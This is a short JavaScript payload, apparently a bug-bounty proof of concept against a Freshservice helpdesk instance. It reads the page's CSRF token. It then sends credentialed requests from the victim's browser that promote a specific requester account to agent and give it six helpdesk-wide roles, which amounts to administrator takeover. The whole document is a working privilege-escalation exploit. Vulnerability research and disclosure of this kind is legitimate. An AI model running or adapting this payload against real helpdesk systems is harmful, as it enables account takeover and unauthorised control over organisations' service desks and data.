async function sendRequests() {
    try {
        // First step call Csrf-Token by create variable and used var name in the headers
        const csrfToken = document.querySelector('meta[name="csrf-token"]').getAttribute('content');

        // Execute POST request that convert requester ==> Agent 
        await fetch('https://h1-h00.freshservice.com/itil/requesters/59000349414/make_agent', {
            method: 'POST',
            credentials: 'include',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                'X-Csrf-Token': csrfToken
            },
            body: '_method=put'
        });

        // Execute PUT request that convert Agent ==> account admin
        await fetch('https://h1-h00.freshservice.com/api/_/agents/59000349414/map_workspace_groups_and_roles', {
            method: 'PUT',
            credentials: 'include',
            headers: {
                'Content-Type': 'application/json',
                'X-Csrf-Token': csrfToken
            },
            body: `{"observer_of":[],"member_of":[],"roles":[{"role_id":59000089955,"assignment_scope":"entire_helpdesk"},{"role_id":59000089956,"assignment_scope":"entire_helpdesk"},{"role_id":59000089957,"assignment_scope":"entire_helpdesk"},{"role_id":59000089958,"assignment_scope":"entire_helpdesk"},{"role_id":59000089959,"assignment_scope":"entire_helpdesk"},{"role_id":59000089960,"assignment_scope":"entire_helpdesk"}],"workspace_id":2}`
        });

        console.log('Requests completed successfully');
    } catch (error) {
        console.error('Error:', error);
    }
}

sendRequests();
